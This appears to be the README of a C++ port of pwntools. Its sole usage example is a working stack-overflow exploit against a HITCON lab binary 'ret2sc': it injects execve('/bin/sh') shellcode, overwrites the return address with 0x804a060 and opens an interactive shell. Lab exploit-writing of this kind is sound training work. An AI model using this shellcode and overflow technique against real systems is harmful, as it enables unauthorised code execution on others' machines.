# pwntoolscpp
pwntools for cpp

```cpp
#include <iostream>

#include "../process.h"
#include "../utility.h"
#include "../elf.h"

int main()
{
    try
    {
        PROCESS p{"/tmp/hitcon/LAB/lab3/ret2sc"};
        ELF e{"/tmp/hitcon/LAB/lab3/ret2sc"};
        std::cout << p.recv_until(":");

        char shellcode[] = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62"
                           "\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81"
                           "\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a"
                           "\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a"
                           "\x0b\x58\xcd\x80\x0a";
        p.send_line(shellcode);

        std::cout << p.recv_until(":");
        std::string payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

        UTILITY util;
        payload.append(util.p32(0x804a060));
        
        p.send_line(payload);
        p.interactive();

       
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }
```

<br>
![full](https://github.com/lucid78/pwntoolscpp/blob/main/images/poc.png)